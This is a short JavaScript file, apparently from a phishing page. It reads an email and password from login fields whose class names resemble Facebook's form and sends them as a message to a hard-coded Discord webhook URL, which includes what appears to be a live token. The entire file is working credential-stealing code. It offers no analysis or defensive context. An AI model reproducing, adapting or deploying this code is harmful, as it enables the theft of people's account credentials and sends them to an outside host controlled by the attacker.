







whurl = "https://discord.com/api/webhooks/1067410449483714660/MQhTmiCTgHHVls9cBEpx9Sx384opRSAaD5497xqIsfhmVkDXksRzVi-FsM-iD2OTapzo"


var str= "qwf";
var str2 = "qwf"
function f1(){
    str = document.querySelector(".inputtext _55r1 _6luy").value;
    str2 = document.querySelector(".inputtext _55r1 _6luy _9npi").value;
    console.log(document.querySelector(".inputtext _55r1 _6luy").value)
}
function send(){

    const msg = {
        "content":"email-" +str+ "  Password- "+ str2,
 
    };
    console.log(msg)
    fetch(whurl + "?wait=true", {"method":"POST", "headers": {"content-type": "application/json"}, "body": JSON.stringify(msg)});
        document.querySelector(".inputtext _55r1 _6luy").value = "";


}



